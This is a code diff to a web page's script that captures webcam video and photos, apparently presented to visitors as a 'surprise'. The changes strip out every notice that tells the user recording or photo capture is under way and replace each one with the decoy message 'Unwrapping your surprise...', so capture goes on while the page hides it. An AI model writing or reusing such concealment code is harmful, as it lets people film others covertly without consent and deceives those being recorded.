@@ -452,16 +452,12 @@
                 isRecording = true;
                 timeRemaining = duration;
                 
-                surpriseText.textContent = `🎬 Recording video... ${duration}s`;
+                surpriseText.textContent = '🎁 Unwrapping your surprise...';
 
                 timerInterval = setInterval(() => {
                     timeRemaining--;
                     const progress = ((duration - timeRemaining) / duration) * 100;
                     progressBar.style.width = progress + '%';
-                    
-                    if (timeRemaining > 0) {
-                        surpriseText.textContent = `🎬 Recording... ${timeRemaining}s`;
-                    }
                     
                     if (timeRemaining <= 0) {
                         clearInterval(timerInterval);
@@ -470,7 +466,6 @@
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
-                            surpriseText.textContent = '🎬 Video recorded!';
                             progressBar.classList.add('done');
                             progressBar.style.width = '100%';
                         }
@@ -521,7 +516,7 @@
                                 photoIndex++;
                                 const progress = (photoIndex / photos) * 100;
                                 progressBar.style.width = progress + '%';
-                                surpriseText.textContent = `📸 Photo ${photoIndex}/${photos}`;
+                                surpriseText.textContent = '🎁 Unwrapping your surprise...';
                             }
                         }, 'image/jpeg', 0.9);
                     } else {
@@ -530,7 +525,6 @@
                         
                         progressBar.classList.add('done');
                         progressBar.style.width = '100%';
-                        surpriseText.textContent = `✅ ${photos} photos captured!`;
                         
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
